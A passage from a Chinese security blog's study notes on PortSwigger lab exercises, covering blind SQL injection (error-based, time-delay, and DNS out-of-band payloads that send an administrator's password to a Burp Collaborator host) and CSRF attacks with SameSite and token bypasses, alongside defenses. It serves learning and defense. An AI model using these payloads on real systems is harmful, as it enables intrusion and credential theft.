<h4 id="通过详细的-SQL-错误消息提取敏感数据"><a href="#通过详细的-SQL-错误消息提取敏感数据" class="headerlink" title="通过详细的 SQL 错误消息提取敏感数据"></a>通过详细的 SQL 错误消息提取敏感数据</h4><p>数据库配置错误有时会导致详细的错误消息。这些消息可能会为攻击者提供有用的信息。例如，请考虑以下错误消息，该消息在将单引号注入id参数后出现：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line">Unterminated string literal started <span class="keyword">at</span> position <span class="number">52</span> <span class="keyword">in</span> <span class="keyword">SQL</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> tracking <span class="keyword">WHERE</span> id <span class="operator">=</span> <span class="string">&#x27;&#x27;&#x27;. Expected char</span></span><br></pre></td></tr></table></figure></div>
<p>有时， 可以诱导应用程序生成包含查询返回的部分数据的错误消息。这有效地将原本盲目的 SQL 注入漏洞变成了可见漏洞。<br> 可以使用CAST()函数来实现这一点。它使 能够将一种数据类型转换为另一种数据类型。例如，假设一个查询包含以下语句：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">CAST((<span class="keyword">SELECT</span> example_column <span class="keyword">FROM</span> example_table) <span class="keyword">AS</span> <span class="type">int</span>)</span><br></pre></td></tr></table></figure></div>
<p>通常， 尝试读取的数据是字符串。尝试将其转换为不兼容的数据类型（例如int ）可能会导致类似于以下内容的错误：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SUBUNIT"><figure class="iseeu highlight /subunit"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ERROR: </span>invalid input syntax for type integer: &quot;Example data&quot;</span><br></pre></td></tr></table></figure></div>

<h4 id="通过触发时间延迟来利用盲-SQL-注入"><a href="#通过触发时间延迟来利用盲-SQL-注入" class="headerlink" title="通过触发时间延迟来利用盲 SQL 注入"></a>通过触发时间延迟来利用盲 SQL 注入</h4><p>如果应用程序在执行 SQL 查询时捕获数据库错误并妥善处理它们，则应用程序的响应不会有任何差异。这意味着以前用于诱导条件错误的技术将不起作用。<br>在这种情况下，通常可以通过触发时间延迟（具体取决于注入条件是真还是假）来利用盲 SQL 注入漏洞。由于应用程序通常同步处理 SQL 查询，因此延迟执行 SQL 查询也会延迟 HTTP 响应。这允许 根据接收 HTTP 响应所花费的时间来确定注入条件的真实性。<br>触发时间延迟的技术特定于所使用的数据库类型。例如，在 Microsoft SQL Server 上， 可以使用以下命令测试条件并根据表达式是否为真触发延迟：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;; IF (1=2) WAITFOR DELAY &#x27;</span>0:0:10<span class="string">&#x27;--</span></span><br><span class="line"><span class="string">&#x27;</span>; <span class="keyword">IF</span> (<span class="attribute">1</span>=1) WAITFOR DELAY <span class="string">&#x27;0:0:10&#x27;</span>--</span><br></pre></td></tr></table></figure></div>
<p>使用这种技术，我们可以通过一次测试一个字符来检索数据</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;; IF (SELECT COUNT(Username) FROM Users WHERE Username = &#x27;</span>Administrato<span class="string">r&#x27; AND SUBSTRING(Password, 1, 1) &gt; &#x27;</span>m<span class="string">&#x27;) = 1 WAITFOR DELAY &#x27;</span><span class="number">0</span>:<span class="number">0</span>:&#123;delay&#125;<span class="string">&#x27;--</span></span><br></pre></td></tr></table></figure></div>
<h4 id="使用带外-OAST-技术利用盲-SQL-注入"><a href="#使用带外-OAST-技术利用盲-SQL-注入" class="headerlink" title="使用带外 (OAST) 技术利用盲 SQL 注入"></a>使用带外 (OAST) 技术利用盲 SQL 注入</h4><p>应用程序可能会执行与上一个示例相同的 SQL 查询，但以异步方式执行。应用程序继续在原始线程中处理用户的请求，并使用另一个线程使用跟踪 cookie 执行 SQL 查询。该查询仍然容易受到 SQL 注入攻击，但到目前为止描述的任何技术都不起作用。应用程序的响应不依赖于查询返回的任何数据、发生的数据库错误或执行查询所花费的时间。<br>在这种情况下，通常可以通过触发与 控制的系统之间的带外网络交互来利用盲 SQL 注入漏洞。这些可以根据注入的条件触发，以一次推断一条信息。更有用的是，数据可以直接在网络交互中泄露。<br>有多种网络协议可用于此目的，但通常最有效的是 DNS（域名服务）。许多生产网络允许 DNS 查询自由出站，因为它们对于生产系统的正常运行至关重要。<br>触发 DNS 查询的技术特定于所使用的数据库类型。例如，Microsoft SQL Server 上的以下输入可用于在指定域上引发 DNS 查找：</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">&#x27;; exec master..xp_dirtree &#x27;<span class="comment">//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a&#x27;--</span></span><br></pre></td></tr></table></figure>
<p>确认了触发带外交互的方法后，你就可以使用带外通道从易受攻击的应用程序中窃取数据。例如</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username=&#x27;</span>Administrato<span class="string">r&#x27;);exec(&#x27;</span>master..xp_dirtree <span class="string">&quot;//&#x27;+@p+&#x27;.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a&quot;</span><span class="string">&#x27;)--</span></span><br></pre></td></tr></table></figure></div>
<p>此输入读取Administrator用户的密码，附加唯一的 Collaborator 子域，并触发 DNS 查找。此查找允许 查看捕获的密码：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line">S3cure<span class="selector-class">.cwcsgt05ikji0n1f2qlzn5118sek29</span><span class="selector-class">.burpcollaborator</span>.net</span><br></pre></td></tr></table></figure></div>
<p>（关于这些dns的payload都在<a href="https://portswigger.net/web-security/sql-injection/cheat-sheet%EF%BC%89">https://portswigger.net/web-security/sql-injection/cheat-sheet）</a><br><img src="https://pic1.imgdb.cn/item/67caac3a066befcec6e0368e.png"><br>如果在COLLABORATOR中看到访问记录的话，就说明成功了<br>带外 (OAST) 技术是检测和利用盲 SQL 注入的有效方法，因为它的成功率很高，并且能够直接窃取带外通道内的数据。因此，即使在其他盲目利用技术有效的情况下，OAST 技术通常也是首选。<br>比如利用下面这个payload拿到admin的密码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">TrackingId=x&#x27;+UNION+SELECT+EXTRACTVALUE(xmltype(&#x27;&lt;%3fxml+version%3d&quot;1.0&quot;+encoding%3d&quot;UTF-8&quot;%3f&gt;<span class="meta">&lt;!DOCTYPE+root+[+<span class="meta">&lt;!ENTITY+%25</span></span></span><br><span class="line"><span class="meta"><span class="meta">+remote+SYSTEM+<span class="string">&quot;http%3a//&#x27;||(SELECT+password+FROM+users+WHERE+username%3d&#x27;administrator&#x27;)||&#x27;.BURP-COLLABORATOR-SUBDOMAIN/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">+%25remote%3b]&gt;</span>&#x27;),&#x27;/l&#x27;)+FROM+dual--</span><br></pre></td></tr></table></figure></div>
<p>在COLLABORATOR的响应中看到的dns在COLLABORATOR payload前面的字符串就是密码<br><img src="https://pic1.imgdb.cn/item/67caaf48066befcec6e03c91.png"></p>
<h2 id="如何防止sql注入"><a href="#如何防止sql注入" class="headerlink" title="如何防止sql注入"></a>如何防止sql注入</h2><p> 可以使用参数化查询（而不是查询中的字符串连接）来防止大多数 SQL 注入实例。这些参数化查询也称为“准备好的语句”。<br>下代码容易受到 SQL 注入攻击，因为用户输入直接连接到查询中：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">String query = &quot;SELECT * FROM products WHERE category = &#x27;&quot;+ <span class="keyword">input</span> + &quot;&#x27;&quot;;</span><br><span class="line"><span class="keyword">Statement</span> <span class="keyword">statement</span> = <span class="keyword">connection</span>.createStatement();</span><br><span class="line">ResultSet resultSet = <span class="keyword">statement</span>.executeQuery(query);</span><br></pre></td></tr></table></figure></div>
<p>可以重写此代码，以防止用户输入干扰查询结构：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">PreparedStatement <span class="keyword">statement</span> = <span class="keyword">connection</span>.prepareStatement(&quot;SELECT * FROM products WHERE category = ?&quot;);</span><br><span class="line"><span class="keyword">statement</span>.setString(<span class="number">1</span>, <span class="keyword">input</span>);</span><br><span class="line">ResultSet resultSet = <span class="keyword">statement</span>.executeQuery();</span><br></pre></td></tr></table></figure></div>

<p>对于不受信任的输入作为查询中的数据出现的任何情况， 都可以使用参数化查询，包括WHERE子句和INSERT或UPDATE语句中的值。它们不能用于处理查询其他部分中的不受信任的输入，例如表或列名称，或ORDER BY子句。将不受信任的数据放入查询的这些部分的应用程序功能需要采取不同的方法，例如：</p>
<ul>
<li>将允许的输入值列入白名单。</li>
<li>使用不同的逻辑来提供所需的行为。</li>
</ul>
<p>为了使参数化查询能够有效防止 SQL 注入，查询中使用的字符串必须始终是硬编码常量。它绝不能包含任何来源的变量数据。不要试图逐个确定某项数据是否可信，在被视为安全的情况下继续在查询中使用字符串连接。很容易对数据的可能来源产生错误判断，或者对其他代码进行更改以污染可信数据。</p>
]]></content>
      <categories>
        <category>漏洞</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>笔记</tag>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>CSRF漏洞学习笔记</title>
    <url>/posts/40609.html</url>
    <content><![CDATA[<p>bp实验室的CSRF漏洞学习笔记</p>
<span id="more"></span>
<h2 id="什么是CSRF（跨站请求伪造）漏洞"><a href="#什么是CSRF（跨站请求伪造）漏洞" class="headerlink" title="什么是CSRF（跨站请求伪造）漏洞"></a>什么是CSRF（跨站请求伪造）漏洞</h2><p>攻击者可以利用这漏洞来执行他们不被预期的命令。它允许攻击者部分规避同源策略，该策略旨在防止不同网站相互干扰。</p>
<p>在成功的 CSRF 攻击中，攻击者会导致受害用户无意中执行操作。例如，这可能是更改其帐户上的电子邮件地址、更改其密码或进行资金转账。根据操作的性质，攻击者可能能够完全控制用户的帐户。如果受感染的用户在应用程序中拥有特权角色，那么攻击者可能能够完全控制应用程序的所有数据和功能。</p>
<h2 id="CSRF是如何起效的"><a href="#CSRF是如何起效的" class="headerlink" title="CSRF是如何起效的"></a>CSRF是如何起效的</h2><p>想要触发CSRF就要满足下面的三个条件</p>
<ul>
<li><strong>相关操作</strong>。应用程序中存在攻击者有理由诱发的操作。这可能是特权操作（例如修改其他用户的权限）或针对用户特定数据的任何操作（例如更改用户自己的密码）。</li>
<li><strong>基于 Cookie 的会话处理</strong>。执行操作涉及发出一个或多个 HTTP 请求，应用程序仅依靠会话 cookie 来识别发出请求的用户。没有其他机制来跟踪会话或验证用户请求。</li>
<li><strong>没有不可预测的请求参数</strong>。执行操作的请求不包含任何攻击者无法确定或猜测其值的参数。例如，当导致用户更改密码时，如果攻击者需要知道现有密码的值，则该功能不会受到攻击。</li>
</ul>
<p>比如某个网页有修改邮箱密码的功能，当用户执行这个操作的时候，他们就会发送下面的请求</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/email/change</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>30</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">email</span>=wiener@normal-user.com</span></span><br></pre></td></tr></table></figure></div>
<p>这就满足了相关操作 cookie认证 以及参数可以预知的要求，所以存在csrf漏洞。<br>攻击者可以创建一个html网页</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://vulnerable-website.com/email/change&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;pwned@evil-user.net&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="property">forms</span>[<span class="number">0</span>].<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">        </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>当用户访问这个网页的时候，攻击者的页面将触发对存在漏洞的网站的 HTTP 请求。如果用户登录之后，他们的浏览器将自动在请求中包含他们的会话 cookie。<br>存在漏洞的网站将以正常方式处理该请求，将其视为受害者用户发出的请求，并更改其电子邮件地址。</p>
<h2 id="如何构造CSRF"><a href="#如何构造CSRF" class="headerlink" title="如何构造CSRF"></a>如何构造CSRF</h2><p>可以使用bp自带的CSRF poc生成器<br>比如这个网页有一个修改邮箱的功能，在登录自己的账户之后，抓包<br><img src="https://pic1.imgdb.cn/item/67c45dc0d0e0a243d40a2b00.png"><br>在这个页面用bp自带的CSRF poc生成器，然后点击regenerate 把这个poc放在我们的服务器上，<br>这样子用户在点击这个请求的时候，浏览器就会发送请求给修改邮箱的界面，因为浏览器中存着用户的cookie，就分不清是用户还是攻击者的恶意请求</p>
<h2 id="怎么传播CSRF"><a href="#怎么传播CSRF" class="headerlink" title="怎么传播CSRF"></a>怎么传播CSRF</h2><p>上面说了CSRF怎么构建，现在要怎么让用户来触发这个漏洞呢。通常，攻击者会将恶意 HTML 放到他们控制的网站上，然后诱使受害者访问该网站。这可能通过向用户提供该网站的链接（通过电子邮件或社交媒体消息）来实现。</p>
<p>一些简单的CSRF漏洞利用了GET方法，并且可以完全独立于易受攻击的网站上的单个 URL。攻击者可以直接向受害者提供易受攻击的域上的恶意 URL。在前面的示例中，如果可以使用 GET 方法执行更改电子邮件地址的请求，那么自包含攻击将如下所示：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;https://vulnerable-website.com/email/change?email=pwned@evil-user.net&quot;</span>&gt;</span><br></pre></td></tr></table></figure></div>

<h2 id="CSRF常见的防护措施"><a href="#CSRF常见的防护措施" class="headerlink" title="CSRF常见的防护措施"></a>CSRF常见的防护措施</h2><h3 id="CSRF-tokens"><a href="#CSRF-tokens" class="headerlink" title="CSRF-tokens"></a>CSRF-tokens</h3><p>由服务器端应用程序生成并与客户端共享的唯一、秘密且不可预测的值。当尝试执行敏感操作（例如提交表单）时，客户端必须在请求中包含正确的CSRF-tokens.这使得攻击者很难代表受害者构建有效的请求。</p>
<p>与客户端共享 CSRF tokens的常见方法是将它们作为隐藏参数包含在 HTML 表单中，例如：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">&lt;form <span class="type">name</span>=&quot;change-email-form&quot; action=&quot;/my-account/change-email&quot; <span class="keyword">method</span>=&quot;POST&quot;&gt;</span><br><span class="line">    &lt;label&gt;Email&lt;/label&gt;</span><br><span class="line">    &lt;<span class="keyword">input</span> required <span class="keyword">type</span>=&quot;email&quot; <span class="type">name</span>=&quot;email&quot; <span class="keyword">value</span>=&quot;example@normal-website.com&quot;&gt;</span><br><span class="line">    &lt;<span class="keyword">input</span> required <span class="keyword">type</span>=&quot;hidden&quot; <span class="type">name</span>=&quot;csrf&quot; <span class="keyword">value</span>=&quot;50FaWgdOhi9M9wyna8taR1k3ODOR8d6u&quot;&gt;</span><br><span class="line">    &lt;button <span class="keyword">class</span>=<span class="string">&#x27;button&#x27;</span> <span class="keyword">type</span>=<span class="string">&#x27;submit&#x27;</span>&gt; <span class="keyword">Update</span> email &lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></div>

<p>常见缺陷：</p>
<ul>
<li>1、当请求使用 POST 方法时，某些应用程序会正确验证tokens，但使用 GET 方法时则会跳过验证。在这种情况下，攻击者可以切换到 GET 方法来绕过验证并发起 CSRF 攻击：</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/email/change?email=pwned@evil-user.net</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm</span><br></pre></td></tr></table></figure></div>
<p>在bp请求中右键切换请求方式就可以了</p>
<ul>
<li><p>2、当tokens存在时，某些应用程序会正确验证tokens，但如果省略tokens，则会跳过验证。</p>
</li>
<li><p>3、一些应用程序确实将 CSRF  tokens绑定到 Cookie，但不会绑定到用于跟踪会话的同一 Cookie<br>比如我有两个用户，我在a用户的cookie和csrf在b用户上也能用</p>
</li>
</ul>
<p>Cookie 设置行为甚至不需要存在于与 CSRF 漏洞相同的 Web 应用程序中。如果受控 Cookie 具有合适的范围，则同一整体 DNS 域中的任何其他应用程序都可能被利用来在目标应用程序中设置 Cookie。例如，可以利用 staging.demo.normal-website.com 上的 Cookie 设置函数来放置提交给 secure.normal-website.com Cookie。</p>
<ul>
<li>4、 CSRF token 只是在 cookie 中复制<br>在这种情况下，如果网站包含任何 cookie 设置功能，攻击者可以再次执行 CSRF 攻击。此时，攻击者无需获取自己的有效 tokens。他们只需发明一个 tokens（如果经过检查，可能是所需的格式），利用 cookie 设置行为将其 cookie 放入受害者的浏览器中，然后在 CSRF 攻击中将其 tokens提供给受害者。</li>
</ul>
<h3 id="SameSite-Cookie"><a href="#SameSite-Cookie" class="headerlink" title="SameSite Cookie"></a>SameSite Cookie</h3><p>SameSite 是一种浏览器安全机制，用于确定何时将网站的 Cookie 包含在来自其他网站的请求中。由于执行敏感操作的请求通常需要经过身份验证的会话 Cookie，因此适当的 SameSite 限制可能会阻止攻击者跨站点触发这些操作。</p>
<p>在 SameSite Cookie 环境中，站点是什么？</p>
<p>在 SameSite Cookie 限制的上下文中，站点被定义为顶级域名 (TLD)，通常为.com 或.net ，加上域名的附加一级。这通常称为 TLD+1。<br><img src="https://pic1.imgdb.cn/item/67c47c75d0e0a243d40a34fa.png"><br>在确定请求是否为同站请求时，还会考虑 URL 方案。这意味着从 <a href="http://app.example.com/">http://app.example.com</a> 到 <a href="https://app.example.com/">https://app.example.com</a> 的链接被大多数浏览器视为跨站请求。</p>
<p>另外用两幅图来区分site和oringin<br><img src="https://pic1.imgdb.cn/item/67c47d5bd0e0a243d40a352c.png"><br><img src="https://pic1.imgdb.cn/item/67c47d66d0e0a243d40a3532.png">\</p>
<p>Samesite的工作方式<br>在引入 SameSite 机制之前，浏览器会在每个请求中向发出请求的域发送 Cookie，即使请求是由不相关的第三方网站触发的。SameSite 的工作原理是让浏览器和网站所有者限制哪些跨站点请求（如果有）应包含特定 Cookie。这有助于减少用户受到 CSRF 攻击的风险，这种攻击会诱使受害者的浏览器发出触发易受攻击的网站的有害操作的请求。由于这些请求通常需要与受害者的经过身份验证的会话相关联的 Cookie，因此如果浏览器不包含此 Cookie，攻击就会失败。<br>所有主流浏览器目前都支持以下 SameSite 限制级别：</p>
<p>Strict<br>Lax<br>None</p>
<p>开发人员可以手动配置他们设置的每个 Cookie 的限制级别，从而更好地控制何时使用这些 Cookie。为此，他们只需在 Set-Cookie 响应标头中包含 SameSite 属性及其首选值：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">Set-Cookie: <span class="attribute">session</span>=0F8tgdOhi9ynR1M9wa3ODa; <span class="attribute">SameSite</span>=Strict</span><br></pre></td></tr></table></figure></div>
<p>如果发布 Cookie 的网站未明确设置 SameSite 属性，Chrome 会默认自动应用 Lax 限制。这意味着 Cookie 仅在符合特定条件的跨站点请求中发送，即使开发人员从未配置此行为。</p>
<p>Strict:<br>如果 Cookie 设置了 SameSite&#x3D;Strict 属性，浏览器将不会在任何跨站点请求中发送该 Cookie。简单来说，这意味着如果请求的目标站点与浏览器地址栏中当前显示的站点不匹配，则不会包含该 Cookie。<br>虽然这是最安全的选择，但在需要跨站点功能的情况下，它可能会对用户体验产生负面影响。</p>
<p>Lac:<br>Lax SameSite 限制意味着浏览器将在跨站点请求中发送 cookie，但前提是满足以下两个条件：</p>
<ul>
<li>请求使用 GET 方法。</li>
<li>该请求源自用户的顶级导航，例如单击链接。</li>
</ul>
<p>这意味着 cookie 不包含在跨站点 POST 请求中。由于 POST 请求通常用于执行修改数据或状态的操作（至少根据最佳实践），因此它们更有可能成为 CSRF 攻击的目标。</p>
<p>当使用 SameSite&#x3D;None 设置 cookie 时，网站还必须包含 Secure 属性，以确保 cookie 仅通过 HTTPS 以加密消息形式发送。否则，浏览器将拒绝该 cookie 并且不会设置。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">Set-Cookie: <span class="attribute">trackingId</span>=0F8tgdOhi9ynR1M9wa3ODa; <span class="attribute">SameSite</span>=None; Secure</span><br></pre></td></tr></table></figure></div>

<h4 id="使用-GET-请求绕过-SameSite-Lax-限制"><a href="#使用-GET-请求绕过-SameSite-Lax-限制" class="headerlink" title="使用 GET 请求绕过 SameSite Lax 限制"></a>使用 GET 请求绕过 SameSite Lax 限制</h4><p>实际上，服务器并不总是对它们是否接收对给定端点的 GET 或 POST 请求很挑剔，即使是那些期望表单提交的服务器。如果他们也对其会话 cookie 使用 Lax 限制（无论是明确还是由于浏览器默认）， 仍然可以通过从受害者的浏览器引出 GET 请求来执行 CSRF 攻击。<br>只要请求涉及顶级导航，浏览器仍将包含受害者的会话 cookie。以下是发起此类攻击的最简单方法之一：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">location</span> = <span class="string">&#x27;https://vulnerable-website.com/account/transfer-payment?recipient=hacker&amp;amount=1000000&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>即使不允许普通的 GET 请求，某些框架也提供了覆盖请求行中指定的方法。例如，Symfony 在表单中支持_method 参数，该参数在路由方面优先于普通方法：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ABNF"><figure class="iseeu highlight /abnf"><table><tr><td class="code"><pre><span class="line">&lt;form action<span class="operator">=</span><span class="string">&quot;https://vulnerable-website.com/account/transfer-payment&quot;</span> method<span class="operator">=</span><span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">    &lt;input type<span class="operator">=</span><span class="string">&quot;hidden&quot;</span> name<span class="operator">=</span><span class="string">&quot;_method&quot;</span> value<span class="operator">=</span><span class="string">&quot;GET&quot;</span>&gt;</span><br><span class="line">    &lt;input type<span class="operator">=</span><span class="string">&quot;hidden&quot;</span> name<span class="operator">=</span><span class="string">&quot;recipient&quot;</span> value<span class="operator">=</span><span class="string">&quot;hacker&quot;</span>&gt;</span><br><span class="line">    &lt;input type<span class="operator">=</span><span class="string">&quot;hidden&quot;</span> name<span class="operator">=</span><span class="string">&quot;amount&quot;</span> value<span class="operator">=</span><span class="string">&quot;1000000&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></div>

<p>比如现在goole使用的POST请求会在两分钟内才能成功验证cookie，我们想绕过这个限制，就可以使用<code>_method</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ACCESSLOG"><figure class="iseeu highlight /accesslog"><table><tr><td class="code"><pre><span class="line">&lt;form action=<span class="string">&quot;https://0a04001c0438b910819c76f500230087.web-security-academy.net/my-account/change-email&quot;</span> method=<span class="string">&quot;<span class="keyword">GET</span>&quot;</span>&gt;</span><br><span class="line">     &lt;input  type=<span class="string">&quot;hidden&quot;</span> name=<span class="string">&quot;_method&quot;</span> value=<span class="string">&quot;<span class="keyword">POST</span>&quot;</span>/&gt;</span><br></pre></td></tr></table></figure></div>
<p>先发送一个GET请求的表单，但是用<code>_method</code>覆盖成POST</p>
<p>有些时候要注意观察网页一些小脚本，小工具。比如在这个网页用户发送一个评论之后，后重定向到blog界面，观察到是调用了一个js<br><img src="https://pic1.imgdb.cn/item/67c580f2d0e0a243d40ac717.png"><br>找到这个js的逻辑只是拼接之后就可以用路径逃逸，像这样<code>/post/comment/confirmation?postId=1/../../my-account</code><br>所以可以利用这个界面生成csrf poc，（前提是发现修改邮箱也可以通过get请求实现）</p>
<p>无论 是在测试其他人的网站还是尝试保护 自己的网站，请务必记住，即使是跨源发出的请求仍然可以是同一站点的。</p>
<h4 id="用新发布的cookie绕过-SameSite-Lax-限制"><a href="#用新发布的cookie绕过-SameSite-Lax-限制" class="headerlink" title="用新发布的cookie绕过 SameSite Lax 限制"></a>用新发布的cookie绕过 SameSite Lax 限制</h4><p>具有 Lax SameSite 限制的 Cookie 通常不会在任何跨站点 POST 请求中发送，但也有一些例外。<br>如果网站在设置 Cookie 时未包含 SameSite 属性，Chrome 会默认自动应用 Lax 限制。但是，为了避免破坏单点登录 (SSO) 机制，它实际上不会在顶级 POST 请求的前 120 秒内强制执行这些限制。因此，在两分钟的时间内，用户可能容易受到跨站点攻击。（此两分钟窗口不适用于使用 SameSite&#x3D;Lax 属性明确设置的 cookie）<br>但是尝试将攻击时间安排在这么短的时间范围内有点不切实际。另一方面，如果你能在网站上找到一个可以强制向受害者发出新会话 cookie 的小工具，那么你可以在进行主要攻击之前先刷新他们的 cookie。例如，完成基于 OAuth 的登录流程可能会导致每次都产生新会话，因为 OAuth 服务不一定知道用户是否仍登录到目标网站。<br>为了触发 cookie 刷新而无需受害者再次手动登录， 需要使用顶级导航，以确保包含与其当前 OAuth 会话相关的 cookie。这带来了额外的挑战，因为 需要将用户重定向回 的网站，以便发起 CSRF 攻击。<br>或者， 可以从新选项卡触发 cookie 刷新，这样浏览器就不会在 能够发起最终攻击之前离开页面。这种方法的一个小问题是，除非通过手动交互打开弹出选项卡，否则浏览器会阻止它们。例如，以下弹出窗口将默认被浏览器阻止：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">window</span>.<span class="keyword">open</span>(<span class="string">&#x27;https://vulnerable-website.com/login/sso&#x27;</span>);</span><br></pre></td></tr></table></figure></div>
<p>为了解决这个问题， 可以将语句包装在 onclick 事件处理程序中，如下所示：</p>
